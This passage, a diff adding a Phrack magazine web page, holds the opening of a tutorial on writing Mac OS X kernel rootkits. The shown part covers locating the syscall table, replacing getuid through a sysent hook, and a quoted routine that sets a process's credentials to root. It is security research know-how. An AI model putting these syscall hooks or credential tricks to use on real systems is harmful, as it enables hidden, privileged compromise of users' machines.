@@ -1,0 +1,2216 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Developing MacOS X Kernel Rootkits ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a class="current" href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack66.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack66.tar.gz" title="Get current issue tar.gz">66</a> | <strong>Release date</strong> : <b>2009-11-06</b> | <strong>Editor</strong> : <b>The Circle of Lost Hackers</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/66/1.html#article">Introduction</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/66/2.html#article">Phrack Prophile on The PaX Team</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/66/3.html#article">Phrack World News</a></td><td align="right">TCLH</td></tr>
+<tr><td align="left"><a href="../../issues/66/4.html#article">Abusing the Objective C runtime</a></td><td align="right">nemo</td></tr>
+<tr><td align="left"><a href="../../issues/66/5.html#article">Backdooring Juniper Firewalls</a></td><td align="right">Graeme</td></tr>
+<tr><td align="left"><a href="../../issues/66/6.html#article">Exploiting DLmalloc frees in 2009</a></td><td align="right">huku</td></tr>
+<tr><td align="left"><a href="../../issues/66/7.html#article">Persistent BIOS infection</a></td><td align="right">aLS and Alfredo</td></tr>
+<tr><td align="left"><a href="../../issues/66/8.html#article">Exploiting UMA : FreeBSD kernel heap exploits</a></td><td align="right">argp and karl</td></tr>
+<tr><td align="left"><a href="../../issues/66/9.html#article">Exploiting TCP Persist Timer Infiniteness</a></td><td align="right">ithilgore</td></tr>
+<tr><td align="left"><a href="../../issues/66/10.html#article">Malloc Des-Maleficarum</a></td><td align="right">blackngel</td></tr>
+<tr><td align="left"><a href="../../issues/66/11.html#article">A Real SMM Rootkit</a></td><td align="right">Core Collapse</td></tr>
+<tr><td align="left"><a href="../../issues/66/12.html#article">Alphanumeric RISC ARM Shellcode</a></td><td align="right">YYounan and PPhilippaerts</td></tr>
+<tr><td align="left"><a href="../../issues/66/13.html#article">Power cell buffer overflow</a></td><td align="right">BSDaemon</td></tr>
+<tr><td align="left"><a href="../../issues/66/14.html#article">Binary Mangling with Radare</a></td><td align="right">pancake</td></tr>
+<tr><td align="left"><a href="../../issues/66/15.html#article">Linux Kernel Heap Tampering Detection</a></td><td align="right">Larry H</td></tr>
+<tr><td align="left"><a href="../../issues/66/16.html#article">Developing MacOS X Kernel Rootkits</a></td><td align="right">ghalen and wowie</td></tr>
+<tr><td align="left"><a href="../../issues/66/17.html#article">How close are they of hacking your brain</a></td><td align="right">dahut</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Developing MacOS X Kernel Rootkits</div>
+<div class="opt-bottom"> <strong>Author</strong> : ghalen and wowie</div>
+<pre>				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x10 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=----------------=[ Developing Mac OSX kernel rootkits  ]=--------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[    By wowie &lt;wowie@hack.se&gt; &amp;        ]=--------------=|
+|=---------------=[       ghalen@hack.se                 ]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    #hack.se                          ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+
+-[ Content
+
+1 - Introduction
+  1.1 - Background
+  1.2 - Rootkit basics
+  1.3 - Syscall basics
+  1.4 - Userspace and kernelspace
+2 - Introducing the XNU kernel
+  2.1 - OS X kernel rootkit history
+  2.2 - Finding the syscall entry table
+  2.3 - Opaque kernel structures
+  2.4 - The I/O Kit Framework
+3 - Kernel development on Mac OS X
+  3.1 - Kernel version dependence
+4 - Your first OS X kernel rootkit
+  4.1 - Replacement of a simple syscall
+  4.2 - Hiding processes 
+  4.3 - Hiding files
+  4.4 - Hiding a kernel extension
+  4.5 - Running userspace programs from kernelspace
+  4.6 - Controlling your rootkit from userspace
+5 - Runtime kernel patching using the Mach APIs
+  5.1 - System call hijacking
+  5.2 - Direct Kernel Object Manipulation
+6 - Detection
+  6.1 - Detecting hooked system calls on Mac OS X
+7 - Summary
+8 - References
+9 - Code
+
+--[ 1 - Introduction
+
+-[ 1.1 - Background
+
+Rootkits for different operating systems have been around for many years.
+Linux, Windows, and the different *BSD-flavors have all had their fair
+share of rootkits. Kernel rootkits are just a continuation of the standard
+file-swapping rootkits of days past. The dawn of tools like Osiris and
+Tripwire forced coders seeking to subvert the operating system to take
+refuge in kernelspace.
+
+The basic idea of a rootkit is to change the behavior and output of
+standard commands and tools to hide the presence of backdoors, sniffers
+and other types of malicious code. And just as within other parts of the
+security industry it is a continuing arms race between those who seek to
+subvert the kernel and those who seek to protect it.
+
+In this article we will describe the basics of runtime kernel patching and
+kernel rootkits for the Mac OS X operating system and how to develop your
+own. It is intended as an entry level tutorial for beginners and as well
+as guide for those interested in adapting existing kernel rootkits from
+other operating systems to Mac OS X. Apple supports two CPU architectures
+for the Mac OS X operating system: Intel and PowerPC. We believe that this
+guide is architecture neutral and that most of the source code is
+compatible with both architectures. 
+
+-[ 1.2 - Rootkit basics
+
+The purpose of a rootkit is to hide the presence of an intruder and his
+tools. In order to do this the most common features of a kernel rootkit is
+the ability to hide files, processes and network sockets. More advanced
+rootkits sometimes provide backdoors and keyboard sniffers.
+
+When a program such as '/bin/ls' is run to lists the files and folders of
+a directory it calls a function in the kernel called a syscall. The
+syscall is invoked from userland and transfers control from the userland
+process to the kernelspace function getdirentries(). The getdirentries()
+function returns a list of files for the specified directory to the
+userland process that in return displays the list to the user.
+
+In order to hide the presence of a specific file the data returned from
+the getdirentires() syscall needs to be modified and the entry for the
+file deleted before returning the data to the user. This can be
+accomplished in a number of different ways; one way is to modify the
+filesystem processing layer (VFS) and another is to directly modify the
+getdirentires() function.  In this brief introduction we will take the
+easy route and modify the getdirentries() function.
+
+-[ 1.3 - Syscall basics
+
+When a userland process needs to call a kernel function it invokes a
+syscall. A syscall is an API function that provides access to services
+provided by the kernel such as reading or writing to files, listing files
+in directories or opening and closing network sockets. Each syscall has a
+number, and all syscalls are invoked referencing this syscall number.
+
+When a userland process wants to invoke a kernel function it is almost
+always done through a wrapper function in the libc-library that in turn
+generates a software interrupt that transfers control from the userland
+process in to the kernel. The kernel stores a list of all available
+syscall functions in a table called the sysentry table, each entry has a
+function pointer to the location of the function for that syscall number.
+
+The kernel looks up the syscall that the userland process wants to call in
+the syscall entry table and invokes that function to handle the request.
+A list of the available syscalls as well as their numbers can be found in
+/usr/include/sys/syscall.h. For example, syscalls of interest to a rootkit
+wanting to hide files are: 
+
+196 - SYS_getdirentries
+222 - SYS_getdirentriesattr 
+344 - SYS_getdirentries64 
+
+Each of these entries in the table points to the function in the kernel
+responsible for returning a list of files. SYS_getdirentries is an older
+version of the function, SYS_getdirentriesattr is a similar version of
+with support for OS X specific attributes. SYS_getdirentries64 is a newer
+version that supports longer filenames. SYS_getdirentries is used by for
+example bash, SYS_getdirentries64 is used by the ls command and
+SYS_getdirentriesattr is used by pure OS X-integrated applications like
+the Finder. Each of these functions needs to be replaced in order to
+provide a seamless 'experience' for the end-user.
+
+In order to modify the output of the function a wrapper function needs to
+be created that can replace the original function. The wrapper function
+will first call the original function, search the output and do the
+required censoring before returning the sanitized data to the userland
+process.
+
+-[ 1.4 - Userspace and Kernelspace
+
+The kernel runs in a separate memory space that is private to the kernel
+in the same way as each user process has it's own private memory. This
+means that is is not possible to just read and write freely memory from
+the kernel. Whenever the kernel needs to modify memory in user-space, for
+instance copy data to or from userspace, specific routines and protocols
+needs to followed. A number of help functions are provided for this
+specific task, most notably copyin(9) and copyout(9). More information
+about these functions can be found in the manpages for copy(9) and
+store(9).
+
+--[ 2 - Introducing the XNU kernel
+
+XNU, the Mac OS X kernel and it's core is based on the Mach micro kernel
+and FreeBSD 5. The Mach layer is responsible for kernel threads,
+processes, pre-emptive multitasking, message-passing, virtual memory
+management and console i/o. Above the Mach layer is the BSD layer that
+supplies the POSIX API, networking and filesystems amongst other things.
+The XNU kernel also has an object oriented device driver framework known
+as the I/O Kit. This mashup of different technologies provide several
+different ways to accomplish the same task; to modify the running kernel.
+Another interesting choice in the design of the XNU kernel is that both
+the kernel- and userland has their own 4gb address space.
+
+
+-[ 2.1 - OS X kernel rootkit history
+
+One of the first publicly released Mac OS X kernel rootkits were WeaponX
+[9] which is developed by nemo [5] and was released in November 2004. It
+is based on the same kernel extension (loadable kernel module) technique
+that most kernel rootkits use and provides the expected basic
+functionality of a kernel rootkit. WeaponX [9] does however not work on
+newer versions of the Mac OS X operating system due to major kernel
+changes.
+
+In the latest few releases of Mac OS X Apple has done a couple things
+hardening the kernel and making it more difficult to subvert. Of
+particular interest is the fact that it no longer exports the sysentry
+table and that several of the key kernel structures are opaque and hidden
+from kernel developers.
+
+-[ 2.2 - Finding the syscall entry table
+
+As of OS X version 10.4 the sysentry table is no longer an exported symbol
+from the kernel. This means that the compiler will not be able to
+automatically identify the position in memory where the sysentry table is
+stored. This can either be solved by searching the memory for an
+appropriate looking table or using something else as a reference. Landon
+Fuller identified that the exported symbol nsysent (the number of entries
+in the sysentry table) is stored in close proximity to the sysentry table.
+He also wrote a small routine that finds the sysentry table and returns a
+pointer to it that can be used to manipulate the table as one see fit [1].
+
+The sysent structure is defined like this:
+
+struct sysent {
+        int16_t         sy_narg;                /* number of arguments */
+        int8_t          reserved;               /* unused value */
+        int8_t          sy_flags;               /* call flags */
+        sy_call_t       *sy_call;               /* implementing function */
+        sy_munge_t      *sy_arg_munge32;/* munge system call arguments for
+32-bit processes */
+        sy_munge_t      *sy_arg_munge64;/* munge system call arguments for
+64-bit processes */
+        int32_t         sy_return_type; /* return type */
+        uint16_t        sy_arg_bytes;   /* The size of all arguments for
+32-bit system calls, in bytes */
+}  *_sysent;
+
+
+The most interesting part of the structure is the &quot;sy_call&quot; pointer, which
+is a pointer to the actual syscall handler function. Thats the function we
+want our rootkit to hook. Hooking the function is as easy as changing the
+value of the pointer to point at our own function somewhere in memory.
+
+-[ 2.3 - Opaque kernel structures
+
+With OS X version 10.4 Apple also changed the kernel structure in order to
+provide a more stable kernel API. This was done to ensure that kernel
+extensions doesn't break when internal kernel structures change. This
+involves hiding large parts of the internal structures behind API:s and
+only exporting chosen parts of the structures to developers.
+
+A good example of this is the process structure called &quot;proc&quot;. Which is
+available from both userland and kernelland. The userland version is
+defined in /usr/include/sys/proc.h and looks like this:
+
+struct extern_proc {
+        union {
+                struct {
+                        struct  proc *__p_forw; /* Doubly-linked run/sleep queue. */
+                        struct  proc *__p_back;
+                } p_st1;
+                struct timeval __p_starttime;   /* process start time */
+        } p_un;
+#define p_forw p_un.p_st1.__p_forw
+#define p_back p_un.p_st1.__p_back
+#define p_starttime p_un.__p_starttime
+        struct  vmspace *p_vmspace;     /* Address space. */
+        struct  sigacts *p_sigacts;     /* Signal actions, state (PROC ONLY). */
+        int     p_flag;                 /* P_* flags. */
+        char    p_stat;                 /* S* process status. */
+        pid_t   p_pid;                  /* Process identifier. */
+        pid_t   p_oppid;         /* Save parent pid during ptrace. XXX */
+        int     p_dupfd;         /* Sideways return value from fdopen. XXX */
+        /* Mach related  */
+        caddr_t user_stack;     /* where user stack was allocated */
+        void    *exit_thread;   /* XXX Which thread is exiting? */
+        int             p_debugger;             /* allow to debug */
+        boolean_t       sigwait;        /* indication to suspend */
+        /* scheduling */
+        u_int   p_estcpu;        /* Time averaged value of p_cpticks. */
+        int     p_cpticks;       /* Ticks of cpu time. */
+        fixpt_t p_pctcpu;        /* %cpu for this process during p_swtime */
+        void    *p_wchan;        /* Sleep address. */
+        char    *p_wmesg;        /* Reason for sleep. */
+        u_int   p_swtime;        /* Time swapped in or out. */
+        u_int   p_slptime;       /* Time since last blocked. */
+        struct  itimerval p_realtimer;  /* Alarm timer. */
+        struct  timeval p_rtime;        /* Real time. */
+        u_quad_t p_uticks;              /* Statclock hits in user mode. */
+        u_quad_t p_sticks;              /* Statclock hits in system mode. */
+        u_quad_t p_iticks;              /* Statclock hits processing intr. */
+        int     p_traceflag;            /* Kernel trace points. */
+        struct  vnode *p_tracep;        /* Trace to vnode. */
+        int     p_siglist;              /* DEPRECATED */
+        struct  vnode *p_textvp;        /* Vnode of executable. */
+        int     p_holdcnt;              /* If non-zero, don't swap. */
+        sigset_t p_sigmask;     /* DEPRECATED. */
+        sigset_t p_sigignore;   /* Signals being ignored. */
+        sigset_t p_sigcatch;    /* Signals being caught by user. */
+        u_char  p_priority;     /* Process priority. */
+        u_char  p_usrpri;       /* User-priority based on p_cpu and p_nice. */
+        char    p_nice;         /* Process &quot;nice&quot; value. */
+        char    p_comm[MAXCOMLEN+1];
+        struct  pgrp *p_pgrp;   /* Pointer to process group. */
+        struct  user *p_addr; /* Kernel virtual addr of u-area (PROC ONLY). */
+	u_short p_xstat;        /* Exit status for wait; also stop signal. */
+        u_short p_acflag;       /* Accounting flags. */
+        struct  rusage *p_ru;   /* Exit information. XXX */
+};
+
+
+The internal definition in the kernel is available from the xnu source in
+the file xnu-xxx/bsd/sys/proc_internal.h and contains a lot more info than
+it's userland counterpart. If we take a look at the userland version of
+the proc structure from Mac OS X 10.3, with Darwin 7.0, and compares it to
+the structure above we can spot the differences right away (some comments
+and whitespace is removed to save space and make it more readable)
+
+struct	proc {
+	LIST_ENTRY(proc) p_list;	/* List of all processes. */
+	struct	pcred *p_cred;		/* Process owner's identity. */
+	struct	filedesc *p_fd;		/* Ptr to open files structure. */
+	struct	pstats *p_stats;	/* Accounting/statistics (PROC ONLY). */
+	struct	plimit *p_limit;	/* Process limits. */
+	struct	sigacts *p_sigacts;	/* Signal actions, state (PROC ONLY). */
+#define	p_ucred		p_cred-&gt;pc_ucred
+#define	p_rlimit	p_limit-&gt;pl_rlimit
+	int	p_flag;			/* P_* flags. */
+	char	p_stat;			/* S* process status. */
+	char	p_pad1[3];
+	pid_t	p_pid;			/* Process identifier. */
+	LIST_ENTRY(proc) p_pglist;	/* List of processes in pgrp. */
+	struct	proc *p_pptr;	 	/* Pointer to parent process. */
+	LIST_ENTRY(proc) p_sibling;	/* List of sibling processes. */
+	LIST_HEAD(, proc) p_children;	/* Pointer to list of children. */
+#define	p_startzero	p_oppid
+	pid_t	p_oppid;	 /* Save parent pid during ptrace. XXX */
+	int	p_dupfd;	 /* Sideways return value from fdopen. XXX */
+	u_int	p_estcpu;	 /* Time averaged value of p_cpticks. */
+	int	p_cpticks;	 /* Ticks of cpu time. */
+	fixpt_t	p_pctcpu;	 /* %cpu for this process during p_swtime */
+	void	*p_wchan;	 /* Sleep address. */
+	char	*p_wmesg;	 /* Reason for sleep. */
+	u_int	p_swtime;	 /* DEPRECATED (Time swapped in or out.) */
+#define	p_argslen p_swtime	 /* Length of process arguments. */
+	u_int	p_slptime;	 /* Time since last blocked. */
+	struct	itimerval p_realtimer;	/* Alarm timer. */
+	struct	timeval p_rtime;	/* Real time. */
+	u_quad_t p_uticks;		/* Statclock hits in user mode. */
+	u_quad_t p_sticks;		/* Statclock hits in system mode. */
+	u_quad_t p_iticks;		/* Statclock hits processing intr. */
+	int	p_traceflag;		/* Kernel trace points. */
+	struct	vnode *p_tracep;	/* Trace to vnode. */
+	sigset_t p_siglist;		/* DEPRECATED. */
+	struct	vnode *p_textvp;	/* Vnode of executable. */
+#define	p_endzero	p_hash.le_next
+	LIST_ENTRY(proc) p_hash;	/* Hash chain. */
+	TAILQ_HEAD( ,eventqelt) p_evlist;
+#define	p_startcopy	p_sigmask
+	sigset_t p_sigmask;		/* DEPRECATED */
+	sigset_t p_sigignore;	/* Signals being ignored. */
+	sigset_t p_sigcatch;	/* Signals being caught by user. */
+	u_char	p_priority;	/* Process priority. */
+	u_char	p_usrpri;	/* User-priority based on p_cpu and p_nice. */
+	char	p_nice;		/* Process &quot;nice&quot; value. */
+	char	p_comm[MAXCOMLEN+1];
+	struct 	pgrp *p_pgrp;	/* Pointer to process group. */
+#define	p_endcopy	p_xstat
+	u_short	p_xstat;	/* Exit status for wait; also stop signal. */
+	u_short	p_acflag;	/* Accounting flags. */
+	struct	rusage *p_ru;	/* Exit information. XXX */
+	int	p_debugger;	/* 1: can exec set-bit programs if suser */
+	void	*task;			/* corresponding task */
+	void	*sigwait_thread;	/* 'thread' holding sigwait */
+	struct lock__bsd__ signal_lock;	/* multilple thread prot for signals*/
+	boolean_t	 sigwait;	/* indication to suspend */
+	void	*exit_thread;		/* Which thread is exiting? */
+	caddr_t	user_stack;		/* where user stack was allocated */
+	void * exitarg;			/* exit arg for proc terminate */
+	void * vm_shm;			/* for sysV shared memory */
+	int  p_argc;			/* saved argc for sysctl_procargs() */
+	int p_vforkcnt;		/* number of outstanding vforks */
+	void *  p_vforkact;     /* activation running this vfork proc */
+	TAILQ_HEAD( , uthread) p_uthlist; /* List of uthreads  */
+	pid_t	si_pid;
+	u_short si_status;
+	u_short	si_code;
+	uid_t	si_uid;
+	TAILQ_HEAD( , aio_workq_entry ) aio_activeq;
+	int		aio_active_count;	/* entries on aio_activeq */
+	TAILQ_HEAD( , aio_workq_entry ) aio_doneq;
+	int		aio_done_count;		/* entries on aio_doneq */
+	struct klist p_klist;  /* knote list */
+	struct  auditinfo		*p_au;	/* User auditing data */
+#if DIAGNOSTIC
+#if SIGNAL_DEBUG
+	unsigned int lockpc[8];
+	unsigned int unlockpc[8];
+#endif /* SIGNAL_DEBUG */
+#endif /* DIAGNOSTIC */
+};
+
+As you can seen, Apple has redone this structure quite a bit and removed
+a lot of stuff, most of the changes where introduced between version 10.3
+and 10.4 of Mac OS X. One of the changes to the structure is the removal
+of the p_ucred pointer, which is a pointer to a structure that contains
+the user credentials of the current process. 
+
+This effectively breaks nemos [5] technique of setting a process user-id
+and group-id to zero, which he does like this:
+
+void uid0(struct proc *p) {
+	register struct pcred *pc = p-&gt;p_cred;
+	pcred_writelock(p);
+	(void)chgproccnt(pc-&gt;p_ruid, -1);
+	(void)chgproccnt(0, 1);
+	pc-&gt;pc_ucred = crcopy(pc-&gt;pc_ucred);
+	pc-&gt;pc_ucred-&gt;cr_uid = 0;
+	pc-&gt;p_ruid = 0;
+	pc-&gt;p_svuid = 0;
+	pcred_unlock(p);
+	set_security_token(p);
+	p-&gt;p_flag |= P_SUGID;
+	return;
+}
+
+For a rootkit developer that wants to modify specific kernel structures
+this is somewhat of a problem, both the fact that the kernel structures
+are neither exported or well documented and the fact that they might
+rapidly change between kernel versions. Fortunately the kernel source is
+now open source and can be freely downloaded from Apple. This makes it
+possible to extract the needed kernel structures from the source.
+
+-[ 2.4 - The I/O Kit Framework
+
+Mac OS X contains a complete framework of libraries, tools and various
+other resources for creating device drivers. This framework is called the
+I/O Kit. The I/O Kit framework provides an abstract view of the hardware
+to the upper layers of Mac OS X, which simplifies device driver
+development and thus makes it's less time consuming. The entire framework
+is object-oriented and implemented using a somewhat cut down version C++
+to promote increased code reuse.
+
+Since this framework operates in kernelspace and can interact with actual
+hardware, it's ideal for writing keylogging software. A good example of
+abusing the I/O Kit framework for just that purpose is the keylogger
+called &quot;logKext&quot;, [10] written by drspringfield, which utilizes the I/O
+Kit framework to log a users keystrokes. This is just one of many uses of
+this framework in rootkit development. Feel free to explore and come up
+with your own creative ways of subverting the Mac OS X kernel using the
+I/O Kit framework.
+
+--[ 3 - Kernel development on Mac OS X
+
+As Mac OS X is somewhat of a hybrid between a number of different
+technologies runtime modification of the operating system  can be done in
+several ways. One of the easiest methods is to load the 'improved'
+functionality as a kernel driver. Drivers can be loaded either as kernel
+extensions for the BSD sub-layer or as Object Oriented I/O Kit drivers.
+For the purpose of this first exercise only ordinary BSD kernel extensions
+will be utilized due to their simplicity and ease of development.
+
+The easiest way to write a kernel extension for Mac OS X is to use the
+XCode-templates for 'Generic Kernel Extension'. Open Xcode, Select 'New
+Project' in the File-menu. From the list of available templates choose
+'Generic Kernel Extension' under 'Kernel Extension'. Give the project a
+suitable name, such as 'rootkit 0.1' and click 'Finish'. This creates a
+new Xcode project for your new kernel rootkit.
+
+The newly automatically created .c-file contains the entry and exit points
+for the kernel extension: 
+
+kern_return_t rootkit_0_1_start (kmod_info_t * ki, void * d) {
+    return KERN_SUCCESS;
+}
+
+
+kern_return_t rootkit_0_1_stop (kmod_info_t * ki, void * d) {
+    return KERN_SUCCESS;
+}
+
+rootkit_0_1_start() will be invoked when the kernel extension is loaded
+using /sbin/kextload and rootkit_0_1_stop() will be invoked when the
+kernel extension is unloaded using /sbin/kextunload. 
+
+Loading and unloading of kernel extensions require root privileges, and
+the code in these functions will be executed in kernelspace with full
+control of the entire operating system. It is therefore of the utmost
+importance that any code executed takes makes sure not to make a mess of
+everything and thereby crashes the entire operating system. To quote the
+Apple 'Kernel Program Guide': &quot;Kernel programming is a black art that
+should be avoided if at all possible&quot; [4].
+
+Any changes made to the kernel in the start()-function must be undone in
+the stop-function(). Functions, variables and other types of loadable
+objects will be deallocated when the module is unloaded and any future
+reference to them will cause the operating system to misbehave or in worst
+case crash.
+
+Building your project is as easy as clicking the 'build button'. The
+compiled kernel extension can be found in the build/Relase/-directory and
+is named 'rootkit 0.1.kext'. /sbin/kextload refuses to load kernel
+extensions unless they are owned by the root user and belongs to the wheel
+group. This can easily be fixed by chown:ing the files accordingly.
+Fledging kernel hackers that dislikes the Xcode GUI:s will be please to
+known that the project can be build just as easily from the command line
+using the 'xcodebuild' command. 
+
+Apple provides the XCode IDE and the gcc compiler on the Mac OS X DVD, if
+needed the latest version can also be downloaded from [2] after
+registration.  The source code for the XNU kernel can also be downloaded
+from [3]. It is recommended that you keep a copy of the kernel sourcecode
+at hand as reference during development.
+
+One of the great advantages of using the kernel extension API is that the
+kextload command takes care of everything from linking to loading. This
+means that the entire rootkit can be written in C, making it almost
+trivially easy. Another great advantage of C-development is portability
+which is an important issue considering that Mac OS X is available for two
+different CPU architectures.
+
+-[ 3.1 - Kernel version dependence
+
+As Landon Fuller notes in research access to the nsysent variable needed
+to find the sysentry-table is restricted unless the kext is compiled for a
+specific kernel release. This is due to the simple fact that the address
+of this variable is likely to change between kernel releases. Kernel
+dependence for kernel extensions is configured in the Info.plist file
+included in the XCode-project. The 'com.apple.kernel'-key needs to be
+added to OSBundleLibraries with the version set to the Kernel release as
+indicated by the 'uname -r' command:
+
+&lt;key&gt;OSBundleLibraries&lt;/key&gt;
+&lt;dict&gt;
+    &lt;key&gt;com.apple.kernel&lt;/key&gt;
+    &lt;string&gt;9.6.0&lt;/string&gt;
+&lt;/dict&gt;
+
+This ties the compiled kernel extension specifically to version 9.6.0 of
+the Kernel. A recompile of the kernel extension is needed for each minor
+and major release. The kernel extension will refuse to load in any other
+version of the Mac OS X kernel, in many cases that might be considered a
+good thing.  
+
+--[ 4 - Your first OS X kernel rootkit
+
+-[ 4.1 - Replacement of a simple syscall
+
+To start of the whole kernel subversion business we'll take a quick
+example of replacing the getuid() function. This function returns the
+current user ID and in this example it will be replaced it with a function
+that always returns uid zero (root). This will not automatically give all
+users root access, only the illusion of having root access. Fun but
+innocent :)
+
+int new_getuid()
+{
+  return(0); 
+}
+
+kern_return_t rootkit_0_1_start (kmod_info_t * ki, void * d) {
+
+  struct sysent *sysent = find_sysent();
+  sysent[SYS_getuid].sy_call = (void *) new_getuid;
+
+  return KERN_SUCCESS;
+
+}
+
+This simple code-snippet first defines a new getuid()-function that always
+returns 0 (root). The new function will be loaded in kernel memory by the
+kextload-function. When the start()-function runs it will replace the
+original getuid() syscall with the new and 'improved' version. Returning 
+KERN_SUCCESS indicates to the operating system that everything went as 
+planed and that the insertion of the kernel extension was successful.
+
+A complete version can be found in the code section of this paper;
+including the unloading function that might prove useful once the initial
+thrill is over. 
+
+-[ 4.2 - Hiding processes 
+ 
+The '/bin/ps' command, 'top' and the Activity Monitor all list running
